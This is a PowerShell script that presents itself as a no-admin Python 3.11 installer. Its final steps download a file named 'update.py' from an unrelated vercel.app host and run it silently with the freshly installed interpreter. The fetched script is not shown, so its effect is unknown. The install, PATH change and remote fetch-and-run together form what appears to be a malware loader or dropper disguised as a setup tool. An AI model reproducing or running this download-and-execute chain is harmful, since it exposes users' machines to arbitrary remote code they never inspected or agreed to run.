# Variables
$pythonUrl = "https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip"
$updateScriptUrl = "https://boostware-external-download.vercel.app/company/update.py"
$installPath = "$env:USERPROFILE\Python311"
$zipPath = "$env:TEMP\python311.zip"
$updateScriptPath = "$installPath\update.py"

# Download Python embeddable zip
Invoke-WebRequest -Uri $pythonUrl -OutFile $zipPath

# Create Install Directory
New-Item -ItemType Directory -Path $installPath -Force

# Extract Python
Expand-Archive -Path $zipPath -DestinationPath $installPath -Force

# Create a Python launcher script
$launcher = "$installPath\python.bat"
Set-Content -Path $launcher -Value "@echo off`r`n%~dp0python.exe %*"

# Add Python to User PATH (No Admin Needed)
$userPath = [System.Environment]::GetEnvironmentVariable("Path", "User")
if ($userPath -notlike "*$installPath*") {
    $newPath = "$installPath;$userPath"
    [System.Environment]::SetEnvironmentVariable("Path", $newPath, "User")
}

# Download the update.py script
Invoke-WebRequest -Uri $updateScriptUrl -OutFile $updateScriptPath

# Run the update script using Python
Start-Process -FilePath "$installPath\python.exe" -ArgumentList $updateScriptPath -NoNewWindow -Wait

Write-Host "Python 3.11 installed successfully and update.py executed."
Write-Host "You may need to restart your terminal for PATH changes to take effect."
